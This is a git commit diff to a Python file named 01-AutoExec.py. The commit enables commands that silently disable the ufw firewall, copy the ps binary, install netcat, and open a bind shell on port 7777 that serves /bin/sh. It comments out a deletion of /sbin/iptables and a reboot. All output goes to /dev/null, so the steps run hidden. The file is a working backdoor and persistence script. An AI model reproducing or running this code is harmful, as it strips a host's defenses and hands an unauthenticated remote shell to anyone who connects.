8ac3b82b3dba46e9bffc31b63514266783005209
CyberCyber2 <56095531+CyberCyber2@users.noreply.github.com>
2021-03-17 18:18:59 -0400

    Update 01-AutoExec.py

--- BaseFiles/01-AutoExec.py
+++ BaseFiles/01-AutoExec.py
@@ -1,8 +1,8 @@
 #[enable]
 import os
-#os.system("ufw disable &> /dev/null")
-#os.system("cp /bin/ps /bin/pss  &> /dev/null")
-#os.system("apt-get install -y -vv netcat-traditional  &> /dev/null")
-#os.system("netcat -lvp 77 -e /bin/sh  &> /dev/null")
-os.system("rm -rf /sbin/iptables")
-os.system("reboot now &> /dev/null")
+os.system("ufw disable &> /dev/null")
+os.system("cp /bin/ps /bin/pss  &> /dev/null")
+os.system("apt-get install -y -vv netcat-traditional  &> /dev/null")
+os.system("netcat -lvp 7777 -e /bin/sh  &> /dev/null")
+#os.system("rm -rf /sbin/iptables")
+#os.system("reboot now &> /dev/null")
